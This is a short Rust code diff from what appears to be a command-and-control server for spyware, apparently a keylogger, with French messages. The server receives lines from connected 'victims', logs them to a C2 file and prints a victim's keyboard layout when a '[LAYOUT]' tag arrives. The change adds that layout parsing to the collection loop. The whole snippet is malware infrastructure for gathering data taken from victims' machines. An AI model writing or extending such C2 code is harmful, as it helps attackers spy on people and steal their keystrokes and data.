@@ -26,23 +26,27 @@ pub fn start_server() {
                 let reader = BufReader::new(stream);
 
                 for line in reader.lines() {
-                    match line {
-                        Ok(data) => {
-                            println!("{}", data);
+		    match line {
+			Ok(line) => {
+			    if line.starts_with("[LAYOUT]") {
+				println!("🌐 Layout victime : {}", line.replace("[LAYOUT] ", "").trim());
+			    } else {
+				println!("{}", line);
+			    }
 
-                            if let Err(e) = writeln!(file, "{}", data) {
-                                eprintln!("Erreur écriture logC2 : {}", e);
-                            }
-                            if let Err(e) = file.flush() {
-                                eprintln!("Erreur flush logC2 : {}", e);
-                            }
-                        }
-                        Err(e) => {
-                            eprintln!("Erreur lecture stream : {}", e);
-                            break;
-                        }
-                    }
-                }
+			    if let Err(e) = writeln!(file, "{}", line) {
+				eprintln!("Erreur écriture logC2 : {}", e);
+			    }
+			    if let Err(e) = file.flush() {
+				eprintln!("Erreur flush logC2 : {}", e);
+			    }
+			}
+			Err(e) => {
+			    eprintln!("Erreur lecture stream : {}", e);
+			    break;
+			}
+		    }
+		}
 
                 println!("[-] Victime déconnectée.");
             }
